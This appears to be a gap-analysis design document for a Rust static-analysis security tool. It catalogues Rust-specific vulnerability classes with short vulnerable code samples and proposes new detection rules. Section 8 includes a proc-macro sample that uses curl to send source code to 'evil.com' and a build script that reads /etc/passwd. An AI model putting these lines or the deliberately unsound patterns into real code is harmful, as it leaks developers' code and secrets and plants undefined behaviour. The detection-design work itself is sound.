# Rust-cola Gap Analysis: Rust-Specific Security Vulnerabilities

## Executive Summary

After analyzing the 89+ shipped security rules and the backlog, this document identifies **security vulnerability classes specific to Rust** that are either missing or underrepresented in the current detection machinery.

Rust's ownership system, borrow checker, and type safety eliminate many C/C++ vulnerability classes (buffer overflows, use-after-free, double-free, null pointer dereferences in safe code). However, Rust introduces its own unique security considerations that require specialized detection.

---

## Current Coverage Assessment

### Well-Covered Areas ✅

| Category | Rules | Coverage |
|----------|-------|----------|
| **Unsafe Memory Operations** | RUSTCOLA010, 026, 035, 036, 038, 063, 064, 073, 078, 082, 083 | Excellent |
| **Cryptography** | RUSTCOLA011, 012, 039, 045, 046, 062, 065, 066, 084 | Excellent |
| **Input Validation/Injection** | RUSTCOLA006, 076, 079, 086, 087, 088, 089, 090, 091 | Excellent |
| **Concurrency Basics** | RUSTCOLA015, 023, 025, 027, 030, 040, 041, 074 | Good |
| **Resource Management** | RUSTCOLA032, 053, 054, 055, 056, 057, 067 | Good |
| **FFI Safety** | RUSTCOLA016, 017, 033, 036 | Good |

### Underrepresented Areas 🟡

| Category | Existing Rules | Gap Assessment |
|----------|---------------|----------------|
| **Async/Await Correctness** | RUSTCOLA037 only | Major gap |
| **Lifetime & Borrow Bugs** | None specific | Major gap |
| **Trait Object Safety** | Partial (Send/Sync) | Moderate gap |
| **Interior Mutability Bugs** | RUSTCOLA052, 057 | Moderate gap |
| **Panic Safety in unsafe** | RUSTCOLA040 | Moderate gap |
| **Type Confusion** | Transmute rules | Moderate gap |
| **WebAssembly-specific** | None | Major gap |

---

## Missing Rust-Specific Vulnerability Classes

### 1. **Async/Await Correctness Bugs** 🔴 HIGH PRIORITY

Rust's async model is unique and introduces several vulnerability classes:

#### 1.1 Holding locks across `.await` points
```rust
// VULNERABLE: Mutex guard held across await
async fn bad() {
    let guard = mutex.lock().await;  // or sync Mutex::lock()
    some_async_op().await;  // guard held here!
    use_guard(&guard);
}
```
**Impact:** Deadlocks, resource starvation, DoS
**Detection:** Track MutexGuard/RwLockGuard lifetimes across await points

#### 1.2 Blocking in async context (beyond sleep)
Current RUSTCOLA037 only detects `std::thread::sleep`. Missing:
- `std::sync::Mutex::lock()` (blocking, not tokio::sync)
- `std::fs::*` operations
- `std::net::TcpStream::connect()` (blocking)
- `reqwest::blocking::*`
- Any `#[tokio::main]` calling blocking APIs

#### 1.3 Future cancellation safety
```rust
// VULNERABLE: Partial state if cancelled at await
async fn bad_cancellation() {
    file.write_all(header).await?;
    // If cancelled here, file has partial write
    file.write_all(body).await?;
}
```
**Impact:** Data corruption, inconsistent state

#### 1.4 `!Send` futures sent to multi-threaded runtime
```rust
// VULNERABLE: Rc in async block sent to tokio::spawn
let rc = Rc::new(data);
tokio::spawn(async move {
    use_rc(&rc);  // Rc is !Send!
});
```

### 2. **Lifetime and Borrow Escape Bugs** 🔴 HIGH PRIORITY

Rust's borrow checker operates at compile time, but `unsafe` code can create runtime violations:

#### 2.1 Reference outlives data
```rust
// VULNERABLE: Reference escapes unsafe block
fn bad() -> &'static str {
    let s = String::from("temp");
    unsafe {
        // Transmute to 'static lifetime - UB!
        std::mem::transmute(s.as_str())
    }
}
```
**Detection:** Flag transmutes that change lifetime parameters

#### 2.2 Self-referential struct escapes
```rust
// VULNERABLE: Pin contract violated
struct SelfRef {
    data: String,
    ptr: *const String,  // Points to data
}
impl SelfRef {
    fn new(s: String) -> Pin<Box<Self>> { /* ... */ }
    // Moving this struct after ptr is set = UB
}
```

#### 2.3 Leaked borrows through raw pointers
```rust
// VULNERABLE: Reference converted to pointer and stored
fn bad(data: &Data) -> Processor {
    Processor {
        ptr: data as *const Data  // Borrow escapes!
    }
}
```

### 3. **Interior Mutability Safety Gaps** 🟡 MEDIUM PRIORITY

Beyond RefCell, there are other interior mutability patterns:

#### 3.1 `Cell` used with non-Copy types (via unsafe)
```rust
// VULNERABLE: UnsafeCell misuse
let cell: UnsafeCell<NonCopy> = UnsafeCell::new(val);
unsafe {
    let p1 = cell.get();
    let p2 = cell.get();
    // Both point to same data - aliasing!
    *p1 = new_val;  // Invalidates *p2
}
```

#### 3.2 `OnceCell`/`OnceLock` race conditions
```rust
// VULNERABLE: TOCTOU with OnceCell
if cell.get().is_none() {
    // Another thread may initialize here
    cell.set(compute_value());  // Returns Err if already set
}
let val = cell.get().unwrap();  // Assumes our value
```

#### 3.3 `Lazy` initialization panics
```rust
// VULNERABLE: Lazy poisoning
static CONFIG: Lazy<Config> = Lazy::new(|| {
    panic!("initialization failed")  // Poisons forever
});
```

### 4. **Panic Safety in Unsafe Code** 🟡 MEDIUM PRIORITY

Rust panics can unwind, but unsafe code may leave invariants broken:

#### 4.1 Drop during unwinding with invalid state
```rust
// VULNERABLE: ManuallyDrop + panic
unsafe fn bad() {
    let mut v: Vec<T> = Vec::new();
    let ptr = v.as_mut_ptr();
    ptr.write(uninitialized_value());  // Partially initialized
    panic!();  // Vec::drop runs on invalid memory!
}
```
**Detection:** Track ManuallyDrop, ptr::write, MaybeUninit in panic-capable paths

#### 4.2 `catch_unwind` boundary violations
```rust
// VULNERABLE: Reference passed through catch_unwind
fn bad(data: &mut Data) {
    let result = std::panic::catch_unwind(|| {
        // If panic here, data may be in inconsistent state
        modify(data);
        may_panic();
    });
    use(data);  // data integrity unknown!
}
```

### 5. **Trait Object Safety Issues** 🟡 MEDIUM PRIORITY

#### 5.1 Downcasting without type verification
```rust
// VULNERABLE: Unchecked downcast
fn bad(any: &dyn Any) {
    let concrete = unsafe {
        &*(any as *const dyn Any as *const ConcreteType)
    };
}
```

#### 5.2 Trait object vtable corruption
```rust
// VULNERABLE: Fabricated trait object
unsafe fn bad() {
    let fake_vtable = [0usize; 3];
    let fake_trait_obj: &dyn Trait = std::mem::transmute((
        data_ptr,
        fake_vtable.as_ptr()
    ));
}
```

### 6. **Type System Exploitation** 🟡 MEDIUM PRIORITY

#### 6.1 Variance exploitation in unsafe code
```rust
// VULNERABLE: Covariance exploit
fn bad<'a>(long: &'static str) -> &'a str {
    // Covariance is safe for &str, but not for &mut T
    long
}

fn bad_mut<'a>(long: &'a mut T) -> &'static mut T {
    unsafe { std::mem::transmute(long) }  // UB!
}
```

#### 6.2 PhantomData misuse
```rust
// VULNERABLE: Wrong variance marker
struct Iter<'a, T> {
    ptr: *const T,
    _marker: PhantomData<T>,  // Should be PhantomData<&'a T>!
}
```

### 7. **WebAssembly-Specific Vulnerabilities** 🔴 HIGH PRIORITY (Emerging)

As Rust becomes the primary language for WebAssembly, new vulnerability classes emerge:

#### 7.1 Linear memory out-of-bounds
```rust
// VULNERABLE in WASM: No memory protection
#[no_mangle]
pub extern "C" fn process(ptr: *mut u8, len: usize) {
    unsafe {
        // In WASM, this can access any linear memory!
        std::slice::from_raw_parts_mut(ptr, len);
    }
}
```

#### 7.2 Host function trust assumptions
```rust
// VULNERABLE: Trusting host-provided data
#[wasm_bindgen]
pub fn process_from_js(data: &JsValue) {
    // JsValue could be crafted maliciously by host
}
```

#### 7.3 Component model capability leaks
```rust
// VULNERABLE: Capability passed to untrusted WASM component
let file_handle = wasi::filesystem::open("secret.txt");
call_untrusted_component(file_handle);  // Leaks capability
```

### 8. **Macro Hygiene & Proc-Macro Attacks** 🟡 MEDIUM PRIORITY

#### 8.1 Procedural macro code injection
```rust
// In a proc-macro crate (compile-time attack)
#[proc_macro]
pub fn evil(_input: TokenStream) -> TokenStream {
    // Exfiltrate source code, inject backdoors, etc.
    std::process::Command::new("curl")
        .args(&["-d", &source_code, "http://evil.com"])
        .spawn();
    quote! { fn safe() {} }
}
```
**Detection:** Audit proc-macro dependencies for filesystem/network access

#### 8.2 Build script attacks
```rust
// build.rs - runs at compile time
fn main() {
    std::fs::read_to_string("/etc/passwd");  // Supply chain attack
}
```

### 9. **Const Evaluation Vulnerabilities** 🟢 LOW PRIORITY (Emerging)

#### 9.1 Const fn with side effects (via unsafety)
```rust
// VULNERABLE: Const fn with observable side effects
const unsafe fn bad() -> usize {
    // In theory, const eval is pure, but unsafe can break this
    static mut COUNTER: usize = 0;
    COUNTER += 1;  // Observable mutation in const!
    COUNTER
}
```

---

## Recommended New Rules (Priority Order)

### Tier 1: High Impact, Feasible with Current Infrastructure

| Rule ID | Name | Detection Approach |
|---------|------|-------------------|
| RUSTCOLA093 | `blocking-in-async-context` | Extend RUSTCOLA037 to detect std::sync::Mutex, std::fs::*, std::net::* in async fns |
| RUSTCOLA094 | `mutex-guard-across-await` | Track MutexGuard/RwLockGuard lifetimes; flag if span contains await points |
| RUSTCOLA095 | `transmute-lifetime-change` | Detect transmutes where type differs only in lifetime parameters |
| RUSTCOLA096 | `raw-pointer-from-reference-escape` | Track `as *const T` casts that escape function scope |
| RUSTCOLA097 | `build-script-network-access` | Source-level scan of build.rs for network/process APIs |

### Tier 2: High Impact, Requires MIR Dataflow Improvements

| Rule ID | Name | Detection Approach |
|---------|------|-------------------|
| RUSTCOLA098 | `panic-unsafe-invariant` | Track ManuallyDrop/MaybeUninit in panic-capable control flow |
| RUSTCOLA099 | `catch-unwind-mutable-reference` | Detect &mut passed into catch_unwind closures |
| RUSTCOLA100 | `oncecell-toctou` | Detect get().is_none() followed by set() without atomicity |

### Tier 3: Requires HIR/Advanced Analysis

| Rule ID | Name | Detection Approach |
|---------|------|-------------------|
| RUSTCOLA101 | `variance-transmute-unsound` | Detect contravariant/invariant position transmutes |
| RUSTCOLA102 | `proc-macro-side-effects` | Static analysis of proc-macro dependencies |
| RUSTCOLA103 | `wasm-linear-memory-oob` | WASM-specific bounds checking analysis |

---

## Gap Comparison with Other Languages

### Vulnerabilities Rust Eliminates (vs C/C++)

| C/C++ Vulnerability | Rust Mitigation | Still Possible? |
|---------------------|-----------------|-----------------|
| Buffer overflow | Bounds checking | Only in `unsafe` |
| Use-after-free | Ownership system | Only in `unsafe` |
| Double-free | Move semantics | Only in `unsafe` |
| Null pointer deref | Option<T> | Only in `unsafe` |
| Data races | Send/Sync traits | Only in `unsafe` |
| Uninitialized memory | Default init | Only in `unsafe` + MaybeUninit |
| Format string attacks | Type-safe formatting | ❌ Not possible |

### Vulnerabilities Rust Shares with Other Languages

| Vulnerability Class | Rust Status | Current Coverage |
|--------------------|-------------|------------------|
| SQL Injection | Same as others | RUSTCOLA087 ✅ |
| Path Traversal | Same as others | RUSTCOLA086 ✅ |
| SSRF | Same as others | RUSTCOLA088 ✅ |
| XSS/Template Injection | Same as others | Backlog (46) |
| Command Injection | Same as others | RUSTCOLA006, 031 ✅ |
| Cryptographic Misuse | Same as others | Extensive ✅ |
| DoS via Resource Exhaustion | Same as others | RUSTCOLA090 ✅ |

### Vulnerabilities Unique to Rust

| Vulnerability Class | Rust-Specific? | Coverage |
|--------------------|----------------|----------|
| Unsafe soundness holes | Yes | Partial |
| Send/Sync violations | Yes | RUSTCOLA015, 023 |
| Async/await pitfalls | Yes | RUSTCOLA037 (minimal) |
| Interior mutability misuse | Yes | RUSTCOLA052, 057 |
| Panic safety in FFI | Yes | Backlog (89) |
| Lifetime transmutation | Yes | ❌ Missing |
| Variance exploitation | Yes | ❌ Missing |
| Pin contract violations | Yes | ❌ Missing |

---

## Conclusion

Rust-cola has excellent coverage of:
1. Traditional web application vulnerabilities (injection, SSRF, etc.)
2. Basic unsafe memory operations
3. Cryptographic misuse
4. FFI boundary issues

The primary gaps are in **Rust-specific** vulnerability classes:
1. **Async/await correctness** - High impact, feasible to implement
2. **Lifetime/borrow escapes in unsafe** - High impact, requires advanced analysis
3. **Panic safety invariants** - Medium impact, feasible with MIR dataflow
4. **Type system exploitation** - Medium impact, requires HIR analysis

**Recommendation:** Prioritize rules 1-4 from the Tier 1 list above, as they address high-impact vulnerabilities with existing infrastructure.
